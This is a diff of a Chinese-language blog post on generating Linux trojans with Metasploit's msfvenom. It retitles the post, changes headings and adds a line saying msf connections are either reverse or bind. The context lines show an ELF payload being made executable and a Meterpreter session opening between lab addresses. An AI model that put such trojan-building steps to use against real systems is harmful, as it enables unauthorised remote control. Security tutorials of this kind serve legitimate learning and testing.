@@ -1,6 +1,6 @@
 ---
 layout: post
-title: 使用 msf 生成Ubuntu 64位木马（反向连接、正向连接）
+title: 使用 msf 生成木马
 categories: [安全工具]
 description: docker 版本安装 msf 
 keywords: 安全工具,msf
@@ -29,7 +29,10 @@ msfconsole
 ```[root@localhost ~]# getconf LONG_BIT```
 
 
-## 生成反向连接木马
+> msf 连接分为 `反向连接、正向连接`
+
+
+# 生成反向连接木马
 
 使用kali自带的Msfvenom工具生成木马。
 查看有哪些linux下的载荷：
@@ -88,7 +91,7 @@ chmod a+x shell.elf
 [*] Meterpreter session 2 opened (172.16.252.129:1234 -> 172.16.252.138:56384) at 2020-04-20 07:04:26 -0400
 ```
 
-## 正向连接木马
+# 正向连接木马
 
 类似上面的反向连接木马，可以使用bind_tcp载荷，开启正向连接木马。和反向连接的区别在于：
 反向连接木马是**攻击机开放端口**，靶机连过来；
